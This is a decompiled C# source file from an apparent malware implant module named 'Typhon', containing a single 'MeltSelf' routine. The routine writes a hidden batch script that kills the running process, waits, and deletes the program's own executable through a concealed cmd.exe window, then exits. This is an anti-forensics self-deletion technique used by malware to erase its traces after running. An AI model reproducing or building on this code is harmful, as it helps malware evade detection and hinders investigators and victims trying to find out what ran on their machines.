using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;

namespace Typhon.Modules.Implants
{
	// Token: 0x0200005E RID: 94
	internal class SelfDestruct
	{
		// Token: 0x06000233 RID: 563 RVA: 0x0000C8B4 File Offset: 0x0000AAB4
		public static void MeltSelf()
		{
			string tempFileName = Path.GetTempFileName();
			File.Move(tempFileName, tempFileName + ".bat");
			string location = Assembly.GetExecutingAssembly().Location;
			int id = Process.GetCurrentProcess().Id;
			using (StreamWriter streamWriter = File.AppendText(tempFileName + ".bat"))
			{
				streamWriter.WriteLine("TaskKill /F /IM " + id.ToString());
				streamWriter.WriteLine("Timeout /T 2 /Nobreak");
				streamWriter.WriteLine("Del /ah \"" + location + "\"");
			}
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd.exe",
				Arguments = "/c " + tempFileName + ".bat & Del " + location,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			});
			Thread.Sleep(5000);
			Environment.Exit(0);
		}
	}
}
